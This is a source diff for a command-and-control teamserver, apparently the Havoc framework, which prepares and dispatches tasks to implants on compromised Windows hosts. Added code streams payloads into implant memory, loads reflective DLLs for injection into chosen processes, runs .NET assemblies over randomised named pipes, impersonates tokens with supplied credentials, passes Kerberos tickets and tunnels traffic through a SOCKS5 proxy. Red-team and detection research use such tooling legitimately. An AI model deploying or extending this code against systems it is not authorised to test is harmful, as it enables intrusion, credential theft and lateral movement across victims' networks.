@@ -8,8 +8,10 @@ import (
 	"errors"
 	"fmt"
 	"io"
+	"os"
 	"math/rand"
 	"net"
+	"encoding/binary"
 	"strconv"
 	"strings"
 	"time"
@@ -24,6 +26,40 @@ import (
 
 	"github.com/olekukonko/tablewriter"
 )
+
+// we upload heavy files to the implant in chunks, so SMB agents can handle the size
+func (a *Agent) UploadMemFileInChunks(FileData []byte) uint32 {
+	var ID uint32
+	var chunkSize = DEMON_MAX_RESPONSE_LENGTH
+
+	// generate a random ID
+	ID = rand.Uint32()
+
+	FileSize := len(FileData)
+	// split the file in chunks of DEMON_MAX_RESPONSE_LENGTH
+	for start := 0; start < FileSize; start += chunkSize {
+		end := start + chunkSize
+
+		// necessary check to avoid slicing beyond FileData capacity
+		if end > FileSize {
+			end = FileSize
+		}
+
+		MemFileJob := Job{
+			RequestID: rand.Uint32(),
+			Command: COMMAND_MEM_FILE,
+			Data: []any{
+				ID,
+				uint64(FileSize),
+				FileData[start:end],
+			},
+		}
+
+		a.AddJobToQueue(MemFileJob)
+	}
+
+	return ID
+}
 
 func (a *Agent) TeamserverTaskPrepare(Command string, Console func(AgentID string, Message map[string]string)) error {
 
@@ -89,12 +125,13 @@ func (a *Agent) TeamserverTaskPrepare(Command string, Console func(AgentID strin
 	return nil
 }
 
-func (a *Agent) TaskPrepare(Command int, Info any, Message *map[string]string) (*Job, error) {
+func (a *Agent) TaskPrepare(Command int, Info any, Message *map[string]string, ClientID string) (*Job, error) {
 	var (
 		job = &Job{
-			Command: uint32(Command),
-			Data:    []interface{}{},
-			Created: time.Now().UTC().Format("02/01/2006 15:04:05"),
+			RequestID: rand.Uint32(),
+			Command:   uint32(Command),
+			Data:      []interface{}{},
+			Created:   time.Now().UTC().Format("02/01/2006 15:04:05"),
 		}
 		err error
 	)
@@ -107,6 +144,11 @@ func (a *Agent) TaskPrepare(Command int, Info any, Message *map[string]string) (
 
 	if val, ok := Optional["TaskID"]; ok {
 		job.TaskID = val.(string)
+
+		RequestID, err := strconv.ParseInt(job.TaskID, 16, 64)
+		if err == nil {
+			job.RequestID = uint32(RequestID)
+		}
 	}
 
 	switch Command {
@@ -136,23 +178,27 @@ func (a *Agent) TaskPrepare(Command int, Info any, Message *map[string]string) (
 
 	case COMMAND_SLEEP:
 		var (
-			Delay int
-			err   error
+			Delay    int
+			Jitter   int
+			err      error
+			ArgArray []string
 		)
 
-		if val, ok := Optional["Arguments"]; ok {
+		ArgArray = strings.Split(Optional["Arguments"].(string), ";")
 
-			Delay, err = strconv.Atoi(val.(string))
-			if err != nil {
-				return nil, err
-			}
+		Delay, err = strconv.Atoi(ArgArray[0])
+		if err != nil {
+			return nil, err
+		}
 
-			job.Data = []interface{}{
-				Delay,
-			}
+		Jitter, err = strconv.Atoi(ArgArray[1])
+		if err != nil {
+			return nil, err
+		}
 
-		} else {
-			return nil, fmt.Errorf("no sleep delay specified: \"Arguments\" is not specified")
+		job.Data = []interface{}{
+			Delay,
+			Jitter,
 		}
 
 	case COMMAND_FS:
@@ -204,9 +250,10 @@ func (a *Agent) TaskPrepare(Command int, Info any, Message *map[string]string) (
 
 		case "upload":
 			var (
-				FileName []byte
-				Content  []byte
-				ArgArray []string
+				FileName  []byte
+				Content   []byte
+				ArgArray  []string
+				MemFileId uint32
 			)
 
 			ArgArray = strings.Split(Arguments, ";")
@@ -223,11 +270,13 @@ func (a *Agent) TaskPrepare(Command int, Info any, Message *map[string]string) (
 				return nil, err
 			}
 
+			MemFileId = a.UploadMemFileInChunks(Content)
+
 			SubCommand = 3
 			job.Data = []interface{}{
 				SubCommand,
 				FileName,
-				Content,
+				MemFileId,
 			}
 			break
 
@@ -323,7 +372,7 @@ func (a *Agent) TaskPrepare(Command int, Info any, Message *map[string]string) (
 		)
 
 		switch SubCommand {
-		case 2:
+		case DEMON_COMMAND_PROC_MODULES:
 			var pid, _ = strconv.Atoi(Arguments)
 			job.Data = []interface{}{
 				SubCommand,
@@ -331,62 +380,57 @@ func (a *Agent) TaskPrepare(Command int, Info any, Message *map[string]string) (
 			}
 			break
 
-		case 3:
+		case DEMON_COMMAND_PROC_GREP:
 			job.Data = []interface{}{
 				SubCommand,
 				Arguments,
 			}
 			break
 
-		case 4:
+		case DEMON_COMMAND_PROC_CREATE:
 
 			var (
 				Args           = strings.Split(Arguments, ";")
-				Process        any
+				Process        string
 				ProcessArgs    string
 				ProcessState   int
 				ProcessPiped   int
 				ProcessVerbose int
 			)
 
-			// State, ProcessApp, Verbose, Piped, ProcessArg
-			if len(Args) > 4 {
-				ProcArgs, _ := base64.StdEncoding.DecodeString(Args[4])
-				ProcessArgs = string(ProcArgs)
-			}
-
+			// State, Verbose, Piped, ProcessApp, ProcessArg
 			ProcessState, err := strconv.Atoi(Args[0])
 			if err != nil {
 				logger.Error("")
 			}
 
-			if len(Args[1]) != 0 {
-				Process = Args[1]
-			} else {
-				Process = 0
-			}
-
 			ProcessVerbose = 0
-			if strings.ToLower(Args[2]) == "true" {
+			if strings.ToLower(Args[1]) == "true" {
 				ProcessVerbose = 1
 			}
 
 			ProcessPiped = 0
-			if strings.ToLower(Args[3]) == "true" {
+			if strings.ToLower(Args[2]) == "true" {
 				ProcessPiped = 1
 			}
+
+			Process = string(Args[3])
+
+			ProcArgs, _ := base64.StdEncoding.DecodeString(Args[4])
+			ProcessArgs = string(ProcArgs)
 
 			job.Data = []interface{}{
 				SubCommand,
 				ProcessState,
-				Process,
-				ProcessArgs,
+				common.EncodeUTF16(Process),
+				common.EncodeUTF16(ProcessArgs),
 				ProcessPiped,
 				ProcessVerbose,
 			}
 
 			break
 
+		// TODO: is this used?
 		case 5:
 			var State = 0
 			if Optional["Args"] == "on" {
@@ -400,7 +444,7 @@ func (a *Agent) TaskPrepare(Command int, Info any, Message *map[string]string) (
 
 			break
 
-		case 6:
+		case DEMON_COMMAND_PROC_MEMORY:
 			var (
 				Args        = strings.Split(Arguments, " ")
 				QueryProtec int
@@ -448,7 +492,7 @@ func (a *Agent) TaskPrepare(Command int, Info any, Message *map[string]string) (
 
 			break
 
-		case 7: // proc::kill
+		case DEMON_COMMAND_PROC_KILL:
 			var pid, err = strconv.Atoi(Arguments)
 			if err != nil {
 				logger.Debug("proc::kill failed to parse pid: " + err.Error())
@@ -500,8 +544,23 @@ func (a *Agent) TaskPrepare(Command int, Info any, Message *map[string]string) (
 			ObjectFile   []byte
 			Parameters   []byte
 			Flags        uint32
+			MemFileId    uint32
 			ok           bool
 		)
+
+		if Arguments, ok := Optional["HasCallback"].(string); ok && Arguments == "true" {
+			// if there is a callback for this BOF, means that we need to
+			// store all the output and send it back to the python module
+			// instead of simply printing it on the console
+
+			var bofcallback = &BofCallback{
+				TaskID:   job.RequestID,
+				Output:   "",
+				ClientID: ClientID,
+			}
+
+			a.BofCallbacks = append(a.BofCallbacks, bofcallback)
+		}
 
 		if Arguments, ok := Optional["Arguments"].(string); ok {
 			if Parameters, err = base64.StdEncoding.DecodeString(Arguments); !ok {
@@ -517,6 +576,8 @@ func (a *Agent) TaskPrepare(Command int, Info any, Message *map[string]string) (
 				return nil, err
 			}
 		}
+
+		MemFileId = a.UploadMemFileInChunks(ObjectFile)
 
 		if FunctionName, ok = Optional["FunctionName"].(string); !ok {
 			return nil, errors.New("CoffeeLdr: FunctionName not defined")
@@ -547,7 +608,7 @@ func (a *Agent) TaskPrepare(Command int, Info any, Message *map[string]string) (
 
 		job.Data = []interface{}{
 			FunctionName,
-			ObjectFile,
+			MemFileId,
 			Parameters,
 			Flags,
 		}
@@ -556,19 +617,42 @@ func (a *Agent) TaskPrepare(Command int, Info any, Message *map[string]string) (
 
 	// TODO: make it more malleable/random values
 	case COMMAND_ASSEMBLY_INLINE_EXECUTE:
+		rand.Seed(time.Now().UnixNano())
+		const pipePrefix = "\\\\.\\pipe\\mojo."
+		const (
+			runeALen = 4
+			runeBLen = 4
+			runeCLen = 12
+			runeDLen = 7
+		)
+
+		generateRuneString := func(length int) string {
+			pipeRunes := []rune("0123456789")
+			runes := make([]rune, length)
+			for i := range runes {
+				runes[i] = pipeRunes[rand.Intn(len(pipeRunes))]
+			}
+			return string(runes)
+		}
+
+		finalPipe := pipePrefix + generateRuneString(runeALen) + "." + generateRuneString(runeBLen) + "." + generateRuneString(runeCLen) + generateRuneString(runeDLen)
+
 		var (
 			binaryDecoded, _ = base64.StdEncoding.DecodeString(Optional["Binary"].(string))
 			arguments        = common.EncodeUTF16(Optional["Arguments"].(string))
 			NetVersion       = common.EncodeUTF16("v4.0.30319")
-			PipePath         = common.EncodeUTF16("\\\\.\\pipe\\mojo." + strconv.Itoa(rand.Intn(9999)) + "." + strconv.Itoa(rand.Intn(9999)) + "." + strconv.Itoa(rand.Intn(999999999999)) + strconv.Itoa(rand.Intn(9999999)))
+			PipePath         = common.EncodeUTF16(finalPipe)
 			AppDomainName    = common.EncodeUTF16("DefaultDomain")
+			MemFileId uint32
 		)
+
+		MemFileId = a.UploadMemFileInChunks(binaryDecoded)
 
 		job.Data = []interface{}{
 			PipePath,
 			AppDomainName,
 			NetVersion,
-			binaryDecoded,
+			MemFileId,
 			arguments,
 		}
 
@@ -577,11 +661,21 @@ func (a *Agent) TaskPrepare(Command int, Info any, Message *map[string]string) (
 
 	case COMMAND_SPAWNDLL:
 		var (
-			Binary, _ = base64.StdEncoding.DecodeString(Optional["Binary"].(string))
-			Args, _   = base64.StdEncoding.DecodeString(Optional["Arguments"].(string))
+			Binary, _            = base64.StdEncoding.DecodeString(Optional["Binary"].(string))
+			Args, _              = base64.StdEncoding.DecodeString(Optional["Arguments"].(string))
+			DllReflectiveLdrPath string
+			DllReflectiveLdr     []byte
 		)
 
+		DllReflectiveLdrPath = utils.GetTeamserverPath() + "/payloads/DllLdr.x64.bin"
+
+		DllReflectiveLdr, err := os.ReadFile(DllReflectiveLdrPath)
+		if err != nil {
+			return nil, errors.New("Couldn't read content of file: " + err.Error())
+		}
+
 		job.Data = []interface{}{
+			DllReflectiveLdr,
 			Binary,
 			Args,
 		}
@@ -637,15 +731,25 @@ func (a *Agent) TaskPrepare(Command int, Info any, Message *map[string]string) (
 
 	case COMMAND_INJECT_DLL:
 		var (
-			binaryDecoded, _ = base64.StdEncoding.DecodeString(Optional["Binary"].(string))
-			TargetPID, _     = strconv.Atoi(Optional["PID"].(string))
-			Param, _         = Optional["Arguments"].(string)
-			InjectMethode    int
+			binaryDecoded, _     = base64.StdEncoding.DecodeString(Optional["Binary"].(string))
+			TargetPID, _         = strconv.Atoi(Optional["PID"].(string))
+			Param, _             = Optional["Arguments"].(string)
+			InjectMethode        int
+			DllReflectiveLdr     []byte
+			DllReflectiveLdrPath string
 		)
+
+		DllReflectiveLdrPath = utils.GetTeamserverPath() + "/payloads/DllLdr.x64.bin"
+
+		DllReflectiveLdr, err := os.ReadFile(DllReflectiveLdrPath)
+		if err != nil {
+			return nil, errors.New("Couldn't read content of file: " + err.Error())
+		}
 
 		job.Data = []interface{}{
 			InjectMethode, // Injection technique syscall
 			TargetPID,
+			DllReflectiveLdr,
 			binaryDecoded,
 			Param,
 		}
@@ -816,14 +920,29 @@ func (a *Agent) TaskPrepare(Command int, Info any, Message *map[string]string) (
 				SubCommand = 0x2
 
 				if val, ok := Optional["Arguments"].(string); ok {
-					Arguments, err = strconv.Atoi(val)
+
+					var (
+						PID int
+						Handle int64
+						ArrayData []string
+					)
+
+					ArrayData = strings.Split(val, ";")
+
+					PID, err = strconv.Atoi(ArrayData[0])
 					if err != nil {
-						return job, errors.New("Failed to convert TokenID to int: " + err.Error())
+						return job, errors.New("Failed to convert PID to int: " + err.Error())
+					}
+
+					Handle, err = strconv.ParseInt(ArrayData[1], 16, 64)
+					if err != nil {
+						return job, errors.New("Failed to convert Handle to int: " + err.Error())
 					}
 
 					job.Data = []interface{}{
 						SubCommand,
-						Arguments.(int),
+						PID,
+						int(Handle),
 					}
 				} else {
 					return job, errors.New("token arguments not found")
@@ -853,9 +972,16 @@ func (a *Agent) TaskPrepare(Command int, Info any, Message *map[string]string) (
 			case "privs-get":
 				SubCommand = 0x4
 
+				if PrivName, ok := Optional["Arguments"].(string); ok {
+
 				job.Data = []interface{}{
 					SubCommand,
 					win32.FALSE,
+					PrivName,
+				}
+
+				} else {
+					return job, errors.New("token arguments not found")
 				}
 
 				break
@@ -866,9 +992,9 @@ func (a *Agent) TaskPrepare(Command int, Info any, Message *map[string]string) (
 				if val, ok = Optional["Arguments"].(string); ok {
 
 					var (
-						Domain   []byte
-						User     []byte
-						Password []byte
+						Domain   string
+						User     string
+						Password string
 
 						ArrayData []string
 					)
@@ -878,26 +1004,26 @@ func (a *Agent) TaskPrepare(Command int, Info any, Message *map[string]string) (
 					if val, err := base64.StdEncoding.DecodeString(ArrayData[0]); err != nil {
 						return job, errors.New("Failed to decode Domain: " + err.Error())
 					} else {
-						Domain = val
+						Domain = string(val)
 					}
 
 					if val, err := base64.StdEncoding.DecodeString(ArrayData[1]); err != nil {
 						return job, errors.New("Failed to decode User: " + err.Error())
 					} else {
-						User = val
+						User = string(val)
 					}
 
 					if val, err := base64.StdEncoding.DecodeString(ArrayData[2]); err != nil {
 						return job, errors.New("Failed to decode Password: " + err.Error())
 					} else {
-						Password = val
+						Password = string(val)
 					}
 
 					job.Data = []interface{}{
 						SubCommand,
-						Domain,
-						User,
-						Password,
+						common.EncodeUTF16(Domain),
+						common.EncodeUTF16(User),
+						common.EncodeUTF16(Password),
 					}
 
 					logger.Debug(job.Data)
@@ -947,6 +1073,15 @@ func (a *Agent) TaskPrepare(Command int, Info any, Message *map[string]string) (
 
 			case "clear":
 				SubCommand = 0x9
+
+				job.Data = []interface{}{
+					SubCommand,
+				}
+
+				break
+
+			case "find-tokens":
+				SubCommand = 0xa
 
 				job.Data = []interface{}{
 					SubCommand,
@@ -1085,12 +1220,62 @@ func (a *Agent) TaskPrepare(Command int, Info any, Message *map[string]string) (
 
 		case "inject.spawn64":
 			ConfigId = CONFIG_INJECT_SPAWN64
-			Value = ConfigVal
+			Value = common.EncodeUTF16(ConfigVal.(string))
 			break
 
 		case "inject.spawn32":
 			ConfigId = CONFIG_INJECT_SPAWN32
-			Value = ConfigVal
+			Value = common.EncodeUTF16(ConfigVal.(string))
+			break
+
+		case "killdate":
+			ConfigId = CONFIG_KILLDATE
+			var (
+				KillDate int64
+			)
+			if ConfigVal.(string) != "0" {
+				t, err := time.Parse("2006-01-02 15:04:05", ConfigVal.(string))
+				if err != nil {
+					logger.Error("Failed to parse the kill date: " + err.Error())
+					return nil, errors.New("Invalid date format, use: 2006-01-02 15:04:05")
+				} else {
+					KillDate = t.Unix()
+					if KillDate < time.Now().Unix() {
+						return nil, errors.New("The date can't be in the past")
+					}
+				}
+			} else {
+				KillDate = 0
+			}
+
+			logger.Debug(fmt.Sprintf("KillDate: %d", KillDate))
+
+			job.Data = []interface{}{
+				ConfigId,
+				KillDate,
+			}
+			break
+
+		case "workinghours":
+			ConfigId = CONFIG_WORKINGHOURS
+			var (
+				WorkingHours int32
+			)
+			if ConfigVal.(string) != "0" {
+				WorkingHours, err = common.ParseWorkingHours(ConfigVal.(string))
+				if err != nil {
+					return nil, err
+				}
+			} else {
+				WorkingHours = 0
+			}
+
+			logger.Debug(fmt.Sprintf("WorkingHours: %d", WorkingHours))
+
+			job.Data = []interface{}{
+				ConfigId,
+				WorkingHours,
+			}
 			break
 		}
 
@@ -1184,9 +1369,10 @@ func (a *Agent) TaskPrepare(Command int, Info any, Message *map[string]string) (
 			break
 
 		case DEMON_NET_COMMAND_GROUP:
+			var Target = common.EncodeUTF16(Param)
 			job.Data = []interface{}{
 				NetCommand,
-				Param,
+				Target,
 			}
 			break
 
@@ -1231,7 +1417,7 @@ func (a *Agent) TaskPrepare(Command int, Info any, Message *map[string]string) (
 				PivotCommand,
 			}
 
-		case AGENT_PIVOT_SMB_CONNECT:
+		case DEMON_PIVOT_SMB_CONNECT:
 			job.Data = []interface{}{
 				PivotCommand,
 				common.EncodeUTF16(Param),
@@ -1239,7 +1425,7 @@ func (a *Agent) TaskPrepare(Command int, Info any, Message *map[string]string) (
 
 			break
 
-		case AGENT_PIVOT_SMB_DISCONNECT:
+		case DEMON_PIVOT_SMB_DISCONNECT:
 			var AgentID, err = strconv.ParseInt(Param, 16, 32)
 			if err != nil {
 				return nil, err
@@ -1251,7 +1437,7 @@ func (a *Agent) TaskPrepare(Command int, Info any, Message *map[string]string) (
 			}
 			break
 
-		case AGENT_PIVOT_SMB_COMMAND:
+		case DEMON_PIVOT_SMB_COMMAND:
 			job.Data = []interface{}{
 				PivotCommand,
 			}
@@ -1419,37 +1605,93 @@ func (a *Agent) TaskPrepare(Command int, Info any, Message *map[string]string) (
 			break
 
 		case "socks add":
-
+			if Param == "" {
+				return nil, fmt.Errorf("socks add requieres a port")
+			}
+	
 			var Socks *socks.Socks
 
 			Socks = socks.NewSocks("0.0.0.0:" + Param)
 			if Socks == nil {
-				return nil, errors.New("failed to create a new socks4a instance")
+				return nil, errors.New("failed to create a new socks5 instance")
 			}
 
 			Socks.SetHandler(func(s *socks.Socks, conn net.Conn) {
 
 				var (
 					ConnectJob  Job
+					NegotiationHeader socks.NegotiationHeader
 					SocksHeader socks.SocksHeader
 					err         error
 					SocketId    int32
 				)
 
-				SocksHeader, err = socks.ReadSocksHeader(conn)
+				// parse all the methods supported by the client
+				NegotiationHeader, err = socks.SubNegotiationClient(conn)
 				if err != nil {
-					if err != io.EOF {
-						logger.Error("Failed to read socks header: " + err.Error())
-						return
+					logger.Error("Failed to read socks negotiation header: " + err.Error())
+					return
+				}
+
+				// we only support NOAUTH, there is no real need to support other types
+				HasNoAuth := false
+				for _, Method := range NegotiationHeader.Methods {
+					if Method == socks.NoAuth {
+						HasNoAuth = true
+						break
 					}
 				}
+
+				// is NOAUTH is not an option, then bail out
+				if HasNoAuth == false {
+					_, err = conn.Write([]byte{socks.Version, socks.NoMatch})
+					if err != nil {
+						logger.Error("Failed to send response to socks client: " + err.Error())
+					}
+					return
+				}
+
+				// tell the client that we support NOAUTH
+				_, err = conn.Write([]byte{socks.Version, socks.NoAuth})
+				if err != nil {
+					logger.Error("Failed to send response to socks client: " + err.Error())
+					return
+				}
+
+				SocksHeader, err = socks.ReadSocksHeader(conn)
+				if err != nil {
+					logger.Error("Failed to read socks header: " + err.Error())
+					return
+				}
+
+				/* check if it's a CONNECT command */
+				if SocksHeader.Command != socks.ConnectCommand {
+					err = socks.SendCommandNotSupported(conn)
+					if err != nil {
+						logger.Error("Failed to send response to socks client: " + err.Error())
+						return
+					}
+					return
+				}
+
+				// NOTE: if you don't want to support IPv6, uncomment this:
+				/*
+				if SocksHeader.ATYP == socks.IPv6 {
+					err = socks.SendAddressTypeNotSupported(conn)
+					if err != nil {
+						logger.Error("Failed to send response to socks client: " + err.Error())
+						return
+					}
+					return
+				}
+				*/
 
 				/* generate some random socket id */
 				SocketId = rand.Int31n(0x10000)
 
 				s.Clients = append(s.Clients, SocketId)
 
-				a.SocksClientAdd(SocketId, conn)
+				a.SocksClientAdd(SocketId, conn, SocksHeader.ATYP, SocksHeader.IpDomain, SocksHeader.Port)
 
 				/* now parse the host:port and send it to the agent. */
 				ConnectJob = Job{
@@ -1457,9 +1699,9 @@ func (a *Agent) TaskPrepare(Command int, Info any, Message *map[string]string) (
 					Data: []any{
 						SOCKET_COMMAND_CONNECT,
 						SocketId,
+						SocksHeader.ATYP,
+						SocksHeader.IpDomain,
 						SocksHeader.Port,
-						SocksHeader.IP,
-						SocksHeader.Domain,
 					},
 				}
 
@@ -1505,7 +1747,7 @@ func (a *Agent) TaskPrepare(Command int, Info any, Message *map[string]string) (
 									/* we failed to read from the socks proxy */
 									logger.Error(fmt.Sprintf("Failed to read from socket %x: %v", client.SocketID, err))
 
-									a.SocksClientClose(SocketId)
+									a.SocksClientClose(int32(SocketId))
 
 									/* make a new job */
 									var job = Job{
@@ -1562,7 +1804,7 @@ func (a *Agent) TaskPrepare(Command int, Info any, Message *map[string]string) (
 
 					*Message = map[string]string{
 						"Type":    "Good",
-						"Message": fmt.Sprintf("Started socks4a server on port %v", Param),
+						"Message": fmt.Sprintf("Started socks5 server on port %v", Param),
 						"Output":  "",
 					}
 				}
@@ -1613,14 +1855,14 @@ func (a *Agent) TaskPrepare(Command int, Info any, Message *map[string]string) (
 					for client := range a.SocksSvr[i].Server.Clients {
 
 						/* close the client connection */
-						a.SocksClientClose(client)
+						a.SocksClientClose(a.SocksSvr[i].Server.Clients[client])
 
 						/* make a new job */
 						var job = Job{
 							Command: COMMAND_SOCKET,
 							Data: []any{
 								SOCKET_COMMAND_CLOSE,
-								client,
+								a.SocksSvr[i].Server.Clients[client],
 							},
 						}
 
@@ -1672,14 +1914,14 @@ func (a *Agent) TaskPrepare(Command int, Info any, Message *map[string]string) (
 				for client := range a.SocksSvr[i].Server.Clients {
 
 					/* close the client connection */
-					a.SocksClientClose(client)
+					a.SocksClientClose(a.SocksSvr[i].Server.Clients[client])
 
 					/* make a new job */
 					var job = Job{
 						Command: COMMAND_SOCKET,
 						Data: []any{
 							SOCKET_COMMAND_CLOSE,
-							client,
+							a.SocksSvr[i].Server.Clients[client],
 						},
 					}
 
@@ -1705,6 +1947,134 @@ func (a *Agent) TaskPrepare(Command int, Info any, Message *map[string]string) (
 
 		break
 
+	case COMMAND_KERBEROS:
+		var (
+			SubCommand string
+		)
+
+		if val, ok := Optional["Command"]; ok {
+			SubCommand = val.(string)
+		} else {
+			return job, errors.New("kerberos field Command is empty")
+		}
+
+		switch SubCommand {
+
+		case "luid":
+			job.Data = []interface{}{
+				KERBEROS_COMMAND_LUID,
+			}
+			break
+
+		case "klist":
+			var (
+				luid int64
+				arg1 string
+				arg2 string
+			)
+
+			if val, ok := Optional["Argument1"]; ok {
+				arg1 = val.(string)
+			} else {
+				return job, errors.New("klist field Argument1 is empty")
+			}
+
+			if arg1 == "/all" {
+				job.Data = []interface{}{
+					KERBEROS_COMMAND_KLIST,
+					0,
+				}
+			} else if arg1 == "/luid" {
+				if val, ok := Optional["Argument2"]; ok {
+					arg2 = val.(string)
+					if strings.HasPrefix(arg2, "0x") {
+						luid, err = strconv.ParseInt(arg2[2:], 16, 64)
+					} else {
+						luid, err = strconv.ParseInt(arg2, 16, 64)
+					}
+					if err != nil {
+						return job, errors.New("Invalid Luid value: " + arg2)
+					}
+				} else {
+					return job, errors.New("klist field Argument2 is empty")
+				}
+				job.Data = []interface{}{
+					KERBEROS_COMMAND_KLIST,
+					1,
+					int(luid),
+				}
+			}
+
+			break
+
+		case "purge":
+			var (
+				luid int64
+				arg1 string
+			)
+
+			if val, ok := Optional["Argument"]; ok {
+				arg1 = val.(string)
+			} else {
+				return job, errors.New("purge field Argument is empty")
+			}
+
+			if strings.HasPrefix(arg1, "0x") {
+				luid, err = strconv.ParseInt(arg1[2:], 16, 64)
+			} else {
+				luid, err = strconv.ParseInt(arg1, 16, 64)
+			}
+			if err != nil {
+				return job, errors.New("Invalid Luid value: " + arg1)
+			}
+
+			job.Data = []interface{}{
+				KERBEROS_COMMAND_PURGE,
+				int(luid),
+			}
+
+			break
+
+		case "ptt":
+			var (
+				luid   int64
+				arg    string
+				ticket []byte
+			)
+
+			ticket, err = base64.StdEncoding.DecodeString(Optional["Ticket"].(string))
+			if err != nil {
+				return job, errors.New("ptt field Ticket is invalid")
+			}
+
+			if val, ok := Optional["Luid"]; ok {
+				arg = val.(string)
+			} else {
+				return job, errors.New("ptt field Luid is empty")
+			}
+
+			if strings.HasPrefix(arg, "0x") {
+				luid, err = strconv.ParseInt(arg[2:], 16, 64)
+			} else {
+				luid, err = strconv.ParseInt(arg, 16, 64)
+			}
+			if err != nil {
+				return job, errors.New("Invalid Luid value: " + arg)
+			}
+
+			job.Data = []interface{}{
+				KERBEROS_COMMAND_PTT,
+				ticket,
+				int(luid),
+			}
+
+			break
+
+		default:
+		}
+
+		break
+
 	default:
 		return job, errors.New(fmt.Sprint("Command not found", Command))
 	}
@@ -1712,10 +2082,19 @@ func (a *Agent) TaskPrepare(Command int, Info any, Message *map[string]string) (
 	return job, nil
 }
 
-func (a *Agent) TaskDispatch(CommandID int, Parser *parser.Parser, teamserver TeamServer) {
+func (a *Agent) TaskDispatch(RequestID uint32, CommandID uint32, Parser *parser.Parser, teamserver TeamServer) {
+	var NameID, _ = strconv.ParseInt(a.NameID, 16, 64)
+	AgentID := int(NameID)
+
+	/* if the RequestID was not generated by the TS, reject the request */
+	if a.IsKnownRequestID(RequestID, CommandID) == false {
+		logger.Warn(fmt.Sprintf("Agent: %x, CommandID: %d, unknown RequestID: %x. This is either a bug or malicious activity", AgentID, CommandID, RequestID))
+		return
+	}
+
 	Parser.DecryptBuffer(a.Encryption.AESKey, a.Encryption.AESIv)
 
-	logger.Debug("Task Output: \n" + hex.Dump(Parser.Buffer()))
+	//logger.Debug("Task Output: \n" + hex.Dump(Parser.Buffer()))
 
 	a.UpdateLastCallback(teamserver)
 
@@ -1723,356 +2102,391 @@ func (a *Agent) TaskDispatch(CommandID int, Parser *parser.Parser, teamserver Te
 
 	case COMMAND_GET_JOB:
 		/* this is most likely never going to reach. but just in case... */
+		logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_GET_JOB ??", AgentID))
 		break
 
 	case COMMAND_EXIT:
-		if Parser.Length() >= 4 {
+		if Parser.CanIRead([]parser.ReadType{parser.ReadInt32}) {
 			var (
-				Status  = Parser.ParseInt32()
+				ExitMethod  = Parser.ParseInt32()
 				Message = make(map[string]string)
 			)
 
-			if Status == 1 {
+			logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_EXIT, ExitMethod: %d", AgentID, ExitMethod))
+
+			if ExitMethod == 1 {
 				Message["Type"] = "Good"
 				Message["Message"] = "Agent has been tasked to cleanup and exit thread. cya..."
-			} else if Status == 2 {
+			} else if ExitMethod == 2 {
 				Message["Type"] = "Good"
 				Message["Message"] = "Agent has been tasked to cleanup and exit process. cya..."
 			}
 
 			a.Active = false
 			teamserver.EventAgentMark(a.NameID, "Dead")
+			teamserver.AgentUpdate(a)
+			a.RequestCompleted(RequestID)
 
 			teamserver.AgentConsole(a.NameID, HAVOC_CONSOLE_MESSAGE, Message)
+		} else {
+			logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_EXIT, Invalid packet", AgentID))
 		}
 
+	case COMMAND_KILL_DATE:
+		var (
+			Message = make(map[string]string)
+		)
+
+		logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_KILL_DATE", AgentID))
+
+		Message["Type"] = "Good"
+		Message["Message"] = "Agent has been reached its kill date, tasked to cleanup and exit thread. cya..."
+
+		a.Active = false
+		teamserver.EventAgentMark(a.NameID, "Dead")
+		teamserver.AgentUpdate(a)
+		a.RequestCompleted(RequestID)
+
+		teamserver.AgentConsole(a.NameID, HAVOC_CONSOLE_MESSAGE, Message)
+
 	case COMMAND_CHECKIN:
+		logger.Debug(fmt.Sprintf("Agent: %x, Command: COMMAND_CHECKIN", AgentID))
 		var Message = make(map[string]string)
 
 		Message["Type"] = "Info"
 		Message["Message"] = "Received checkin request"
 
-		if Parser.Length() > 0 {
+		if Parser.Length() >= 32 + 16 {
 			var (
-				MagicValue  int
-				DemonID     int
-				Hostname    string
-				DomainName  string
-				Username    string
-				InternalIP  string
-				ProcessName string
-				ProcessPID  int
-				OsVersion   []int
-				OsArch      int
-				Elevated    int
-				ProcessArch int
-				ProcessPPID int
-				SleepDelay  int
-				Session     = &Agent{
-					Encryption: struct {
-						AESKey []byte
-						AESIv  []byte
-					}{
-						AESKey: Parser.ParseAtLeastBytes(32),
-						AESIv:  Parser.ParseAtLeastBytes(16),
-					},
+				DemonID      int
+				Hostname     string
+				DomainName   string
+				Username     string
+				InternalIP   string
+				ProcessName  string
+				ProcessPID   int
+				OsVersion    []int
+				OsArch       int
+				Elevated     int
+				ProcessArch  int
+				ProcessPPID  int
+				SleepDelay   int
+				SleepJitter  int
+				KillDate     int64
+				WorkingHours int32
+			)
 
-					Active:     false,
-					SessionDir: "",
+			a.Encryption.AESKey = Parser.ParseAtLeastBytes(32)
+			a.Encryption.AESIv = Parser.ParseAtLeastBytes(16)
 
-					Info: new(AgentInfo),
+			if Parser.CanIRead([]parser.ReadType{parser.ReadInt32, parser.ReadBytes, parser.ReadBytes, parser.ReadBytes, parser.ReadBytes, parser.ReadBytes, parser.ReadInt32, parser.ReadInt32, parser.ReadInt32, parser.ReadInt32, parser.ReadInt32, parser.ReadInt32, parser.ReadInt32, parser.ReadInt32, parser.ReadInt32, parser.ReadInt32, parser.ReadInt32, parser.ReadInt32, parser.ReadInt64, parser.ReadInt32}) {
+				DemonID = Parser.ParseInt32()
+				Hostname = Parser.ParseString()
+				Username = Parser.ParseString()
+				DomainName = Parser.ParseString()
+				InternalIP = Parser.ParseString()
+				ProcessName = Parser.ParseString()
+				ProcessPID = Parser.ParseInt32()
+				ProcessPPID = Parser.ParseInt32()
+				ProcessArch = Parser.ParseInt32()
+				Elevated = Parser.ParseInt32()
+				OsVersion = []int{Parser.ParseInt32(), Parser.ParseInt32(), Parser.ParseInt32(), Parser.ParseInt32(), Parser.ParseInt32()}
+				OsArch = Parser.ParseInt32()
+				SleepDelay  = Parser.ParseInt32()
+				SleepJitter = Parser.ParseInt32()
+				KillDate = Parser.ParseInt64()
+				WorkingHours = int32(Parser.ParseInt32())
+
+				a.Active = true
+
+				a.NameID            = fmt.Sprintf("%x", DemonID)
+				a.Info.FirstCallIn  = a.Info.FirstCallIn
+				a.Info.LastCallIn   = a.Info.LastCallIn
+				a.Info.Hostname     = Hostname
+				a.Info.DomainName   = DomainName
+				a.Info.Username     = Username
+				a.Info.InternalIP   = InternalIP
